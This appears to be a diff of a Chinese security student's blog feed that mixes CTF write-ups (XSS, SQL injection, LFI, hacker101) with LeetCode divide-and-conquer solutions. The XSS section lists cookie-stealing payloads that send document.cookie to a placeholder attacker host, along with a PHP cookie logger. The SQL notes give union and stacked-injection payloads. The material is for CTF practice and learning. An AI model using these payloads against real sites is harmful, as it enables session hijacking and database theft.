-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe	onload=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="Web-329"><a href="#Web-329" class="headerlink" title="Web 329"></a>Web 329</h3>]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>wp</category>
-        <category>xss</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>ctfshow</tag>
-        <tag>xss</tag>
-        <tag>wp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Buuoj WP(Web方向-1)</title>
     <url>/2021/11/22/blog0003-buuoj-web-wp-1/</url>
     <content><![CDATA[<h2 id="1、Roar-CTF-Easy-Calc"><a href="#1、Roar-CTF-Easy-Calc" class="headerlink" title="1、Roar-CTF Easy Calc"></a>1、Roar-CTF Easy Calc</h2><p>这题打开界面是一个计算表达式的网页</p>
@@ -479,8 +81,19 @@
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>wp</tag>
         <tag>buuoj</tag>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello world!</title>
+    <url>/2022/01/16/blog0000-hello-world/</url>
+    <content><![CDATA[<h2 id="写在前面的一些话"><a href="#写在前面的一些话" class="headerlink" title="写在前面的一些话"></a>写在前面的一些话</h2><p>Welcome to my blog!</p>
+<span id="more"></span>
+<p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>
+]]></content>
+      <tags>
+        <tag>preface</tag>
       </tags>
   </entry>
   <entry>
@@ -538,6 +151,423 @@
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow-xss-wp</title>
+    <url>/2021/11/23/blog0004-ctfshow-xss-wp/</url>
+    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
+<p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p>
+<p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p>
+<span id="more"></span>
+<p>反射型常见trick：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python for temporary site</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server &#123;port&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP for store the http request</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$log</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]);</span><br><span class="line">	fclose(<span class="variable">$log</span>);</span><br><span class="line">	<span class="comment">//var_dump(scandir(&quot;.&quot;));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span></span><br><span class="line"><span class="comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span></span><br><span class="line"><span class="comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试试(find / -name &quot;cookie.txt&quot;)</span></span><br></pre></td></tr></table></figure>
+<h2 id="反射型（Web316-Web326"><a href="#反射型（Web316-Web326" class="headerlink" title="反射型（Web316 - Web326)"></a>反射型（Web316 - Web326)</h2><p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p>
+<p>不过会有各种过滤</p>
+<p>附上payload，一般都试试，如果过不去了可以试试其他banfa</p>
+<p>xss平台：<a href="https://xss.pt/">https://xss.pt/</a></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先是经典的img</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">	img.src = <span class="string">&quot;http://your-domain:port/&quot;</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//location.href系列</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://your-domain:port/?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//iframe标签</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//input标签</span></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">    </span><br><span class="line">//svg标签</span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">    </span><br><span class="line">//body标签</span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">//img标签</span><br><span class="line">&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;</span><br><span class="line">&lt;img src=&#x27;x&#x27; onclick=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
+<p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
+<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h3 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h3><p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p>
+<p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p>
+<p>顺利搞到管理员的cookie</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe	onload=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Web-329"><a href="#Web-329" class="headerlink" title="Web 329"></a>Web 329</h3>]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+        <category>xss</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>ctfshow</tag>
+        <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HCTF-warmup-目录穿越</title>
+    <url>/2022/01/16/blog0005-HCTF-warmup-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
+    <content><![CDATA[<h2 id="一、题目重点"><a href="#一、题目重点" class="headerlink" title="一、题目重点"></a>一、题目重点</h2><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/wp/LFIHCTF-LFI-wp.png" alt="题目图片"></p>
+<p>我们首先来看一下</p>
+<span id="more"></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+        <category>LFI</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>LFI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入笔记</title>
+    <url>/2022/03/31/blog0002-SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="一、联合注入"><a href="#一、联合注入" class="headerlink" title="一、联合注入"></a>一、联合注入</h2><h3 id="1、基本说明"><a href="#1、基本说明" class="headerlink" title="1、基本说明"></a>1、基本说明</h3><p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
+<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
+<span id="more"></span>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;database_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;database_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,&#123;column_name&#125;,<span class="number">0x5c</span>,&#123;colunm_name&#125;) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;);</span><br><span class="line"># 注意， 爆破内容时我们要考虑引号的问题</span><br><span class="line"># 补一个爆破内容的例子：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,id,<span class="number">0x5c</span>,name) <span class="keyword">from</span> whistle.user);</span><br></pre></td></tr></table></figure>
+<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
+<h3 id="2、补充"><a href="#2、补充" class="headerlink" title="2、补充"></a>2、补充</h3><p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
+<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>
+<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
+<h2 id="二、堆叠注入"><a href="#二、堆叠注入" class="headerlink" title="二、堆叠注入"></a>二、堆叠注入</h2><h3 id="1、说明"><a href="#1、说明" class="headerlink" title="1、说明"></a>1、说明</h3><p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
+<p>大致的原理和RCE中的管道运算符注入一样。</p>
+<h3 id="2、补充-1"><a href="#2、补充-1" class="headerlink" title="2、补充"></a>2、补充</h3><p>先上”随便注”的payload</p>
+<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
+<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>sql</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>leetcode-分治-最接近原点的K个点</title>
+    <url>/2022/03/27/blog0007-leetcode-%E5%88%86%E6%B2%BB-%E6%9C%80%E6%8E%A5%E8%BF%91%E5%8E%9F%E7%82%B9%E7%9A%84K%E4%B8%AA%E7%82%B9/</url>
+    <content><![CDATA[<h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给定一个数组 points ，其中 points[i] = [xi, yi] 表示 X-Y 平面上的一个点，并且是一个整数 k ，返回离原点 (0,0) 最近的 k 个点。</p>
+<p>这里，平面上两点之间的距离是 欧几里德距离（ √(x1 - x2)2 + (y1 - y2)2 ）。</p>
+<p>你可以按 <strong>任何顺序</strong> 返回答案。除了点坐标的顺序之外，答案 确保 是 <strong>唯一</strong> 的。</p>
+<span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：points = [[1,3],[-2,2]], k = 1</span><br><span class="line">输出：[[-2,2]]</span><br><span class="line">解释： </span><br><span class="line">(1, 3) 和原点之间的距离为 sqrt(10)，</span><br><span class="line">(-2, 2) 和原点之间的距离为 sqrt(8)，</span><br><span class="line">由于 sqrt(8) &lt; sqrt(10)，(-2, 2) 离原点更近。</span><br><span class="line">我们只需要距离原点最近的 K = 1 个点，所以答案就是 [[-2,2]]。</span><br><span class="line">示例 2：</span><br><span class="line"></span><br><span class="line">输入：points = [[3,3],[5,-1],[-2,4]], k = 2</span><br><span class="line">输出：[[3,3],[-2,4]]</span><br><span class="line">（答案 [[-2,4],[3,3]] 也会被接受。）</span><br></pre></td></tr></table></figure>
+<h2 id="二、我的思路"><a href="#二、我的思路" class="headerlink" title="二、我的思路"></a>二、我的思路</h2><h4 id="思路一：排序"><a href="#思路一：排序" class="headerlink" title="思路一：排序"></a>思路一：排序</h4><p>显然是非常直观的思路，我们可以直接排序数组，返回前K个数。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">kClosest</span>(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        vector&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;points.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;(i ,points[i][<span class="number">0</span>] * points[i][<span class="number">0</span>] + points[i][<span class="number">1</span>] * points[i][<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(res.<span class="built_in">begin</span>(),res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; (res.<span class="built_in">begin</span>(),res.<span class="built_in">begin</span>() + k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h4><p>我们这次主要是学习分治的思想，因此我们可以考虑使用快排的思路（其实algorithm的sort也是快排），当我们完成一次快排，我们可以将数组分为两个部分，因此我们可以借此不断将数组分割来找到第K个数。</p>
+<p>代码如下：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; dist;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points,<span class="keyword">int</span> beg,<span class="keyword">int</span> end)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = beg;</span><br><span class="line">        <span class="keyword">int</span> j = end;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; p = points[beg];</span><br><span class="line">        <span class="keyword">int</span> p_dist = dist[beg];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; dist[j] &gt; p_dist)</span><br><span class="line">            &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">            &#123;</span><br><span class="line">                points[i] = points[j];</span><br><span class="line">                dist[i] = dist[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; dist[i] &lt;= p_dist)</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">            &#123;</span><br><span class="line">                points[j] = points[i];</span><br><span class="line">                dist[j] = dist[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        points[j] = p;</span><br><span class="line">        dist[j] = p_dist;</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">select_random</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points,<span class="keyword">int</span> left,<span class="keyword">int</span> right,<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot = <span class="built_in">partition</span>(points, left, right);</span><br><span class="line">        <span class="keyword">if</span> (pivot == k)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pivot &lt; k)</span><br><span class="line">        &#123;	<span class="comment">// 注意此时我们使用的是数组的引用，因此我们的K未发生变化</span></span><br><span class="line">            <span class="built_in">select_random</span>(points, pivot + <span class="number">1</span>, right, k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">select_random</span>(points, left, pivot - <span class="number">1</span>, k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">kClosest</span>(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points, <span class="keyword">int</span> k) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tar = k - <span class="number">1</span>;</span><br><span class="line">        dist.<span class="built_in">resize</span>(points.<span class="built_in">size</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; points.<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dist[i] = (points[i][<span class="number">0</span>] * points[i][<span class="number">0</span>] + points[i][<span class="number">1</span>] * points[i][<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">select_random</span>(points, <span class="number">0</span>, points.<span class="built_in">size</span>() - <span class="number">1</span>, tar);</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">res</span>(points.<span class="built_in">begin</span>(), points.<span class="built_in">begin</span>() + k);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>leetcode</category>
+        <category>分治</category>
+      </categories>
+      <tags>
+        <tag>algorithm</tag>
+        <tag>leetcode</tag>
+        <tag>算法</tag>
+        <tag>题解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>leetcode-分治-为运算表达式设计优先级</title>
+    <url>/2022/03/27/blog0006-leetcode-%E5%88%86%E6%B2%BB-%E4%B8%BA%E8%BF%90%E7%AE%97%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%BE%E8%AE%A1%E4%BC%98%E5%85%88%E7%BA%A7/</url>
+    <content><![CDATA[<h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给你一个由数字和运算符组成的字符串 <code>expression</code> ，按不同优先级组合数字和运算符，计算并返回所有可能组合的结果。你可以 <strong>按任意顺序</strong> 返回答案</p>
+<span id="more"></span>
+<p><strong>示例：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：expression = &quot;2-1-1&quot;</span><br><span class="line">输出：[0,2]</span><br><span class="line">解释：</span><br><span class="line">((2-1)-1) = 0 </span><br><span class="line">(2-(1-1)) = 2</span><br><span class="line"></span><br><span class="line">输入：expression = &quot;2*3-4*5&quot;</span><br><span class="line">输出：[-34,-14,-10,-10,10]</span><br><span class="line">解释：</span><br><span class="line">(2*(3-(4*5))) = -34 </span><br><span class="line">((2*3)-(4*5)) = -14 </span><br><span class="line">((2*(3-4))*5) = -10 </span><br><span class="line">(2*((3-4)*5)) = -10 </span><br><span class="line">(((2*3)-4)*5) = 10</span><br></pre></td></tr></table></figure>
+<p><strong>提示：</strong></p>
+<ul>
+<li>1 &lt;= expression.length &lt;= 20</li>
+<li>输入表达式中的所有整数值在范围 [0, 99] </li>
+<li>expression 由数字和算符 ‘+’、’-‘ 和 ‘*’ 组成。</li>
+</ul>
+<h2 id="二、我的思路"><a href="#二、我的思路" class="headerlink" title="二、我的思路"></a>二、我的思路</h2><p>最开始，我的处理思路是对于一个expression，我们可以分解一个数字和一个剩余的表达式。将（2*3-4*5）分解为</p>
+<script type="math/tex; mode=display">
+2*(3-4*5)\\
+2*3-(4*5)</script><p>但显然这样是不对的，我们需要注意的是，这样子我们就没有回头路了，简单的理解就是我们无法处理：</p>
+<script type="math/tex; mode=display">
+((2*3)-4)*5</script><p>但是一旦意识到我们存在这样的错误时，我们发现其实将我们前面的思路改进一下，当我们计算出<script type="math/tex">2*3</script>时，我们就把式子转化为$(6-4)*5$，这又是我们之前处理的范围了。</p>
+<p>于是，我们将我们之前的思路扭转一下，对于任意的表达式$c$，我们可以将其拆分为$a$ op $b$，这样我们就得到了分治处理的思路。</p>
+<p><strong>终止条件为：当表达式不存在操作符时，即表达式为数值时，我们直接返回数值本身</strong></p>
+<p>我的代码如下：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//计算表达式</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2 , <span class="keyword">char</span> op)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span>(op)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">return</span> num1 + num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">return</span> num1 - num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> num1 * num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">diffWaysToCompute</span><span class="params">(string expression)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = expression.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; v3;</span><br><span class="line">        <span class="keyword">int</span> op_flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> op = expression[i];</span><br><span class="line">            <span class="keyword">if</span>(!(op == <span class="string">&#x27;+&#x27;</span> || op == <span class="string">&#x27;-&#x27;</span> || op ==<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            op_flag = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//计算前半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; v1 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>(),expression.<span class="built_in">begin</span>() + i));</span><br><span class="line">            <span class="comment">//计算后半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; v2 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>() + i + <span class="number">1</span>,expression.<span class="built_in">end</span>()));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//二重循环，类似笛卡尔积</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;v1.<span class="built_in">size</span>();i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;v2.<span class="built_in">size</span>();j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    v3.<span class="built_in">push_back</span>(<span class="built_in">cal</span>(v1[i],v2[j],op));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不存在运算符，即到达终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(op_flag == <span class="number">0</span>)</span><br><span class="line">            v3.<span class="built_in">push_back</span>(<span class="built_in">stoi</span>(expression));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>leetcode</category>
+        <category>分治</category>
+      </categories>
+      <tags>
+        <tag>algorithm</tag>
+        <tag>leetcode</tag>
+        <tag>算法</tag>
+        <tag>题解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hacker101系列wp（持续更新中）</title>
+    <url>/2022/03/29/blog0009-hacker101%E7%B3%BB%E5%88%97wp%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="一、Micro-CMS-v1"><a href="#一、Micro-CMS-v1" class="headerlink" title="一、Micro-CMS v1"></a>一、Micro-CMS v1</h2><p>这道题有4个flag，我们逐个分解。</p>
+<span id="more"></span>
+<p>首先一进来，页面异常简洁，直接Ctrl+U，观察一下全局，url中page带数字。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_1.png" alt=""></p>
+<p>其实一般来说page含数字的，我们可以考虑一下是不是有文件包含（include）或者注入点（查询）。</p>
+<p>我们尝试url注入，在page处加上一个引号封闭一下，果然弹出来第一个flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://19d516b0310286729dd8449820bfdb6f.ctf.hacker101.com/page/edit/1&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_2.png" alt=""></p>
+<p>接下来，我们进入test页面，发现这里留了一个留言板，非常有XSS的暗示性，我们直接上手来一个</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_3.png" alt=""></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
